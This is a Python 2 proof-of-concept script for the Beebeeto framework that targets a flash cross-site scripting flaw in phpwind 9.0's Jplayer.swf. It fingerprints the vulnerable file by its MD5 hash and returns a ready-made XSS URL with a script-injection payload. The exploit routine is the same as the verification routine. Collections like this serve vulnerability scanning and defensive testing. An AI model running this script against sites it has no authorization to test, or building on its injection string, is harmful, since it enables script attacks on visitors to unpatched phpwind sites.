#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0201',
            'name': 'phpwind 9.0 /res/js/dev/util_libs/jPlayer/Jplayer.swf 跨站脚本漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-12-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['9.0'],
            'type': 'Cross Site Scripting',
            'tag': ['phpwind漏洞', 'xss漏洞', 'flash xss', 'php'],
            'desc': 'N/A',
            'references': ['http://wooyun.org/bugs/wooyun-2013-017733',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        flash_md5 = "769d053b03973d380da80be5a91c59c2"
        file_path = "/res/js/dev/util_libs/jPlayer/Jplayer.swf"
        verify_url = args['options']['target'] + file_path

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        md5_value = md5.new(content).hexdigest()

        if md5_value in flash_md5:
            args['success'] = True
            args['poc_ret']['xss_url'] = verify_url + '?jQuery=alert(1))}catch(e){}//'
            return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())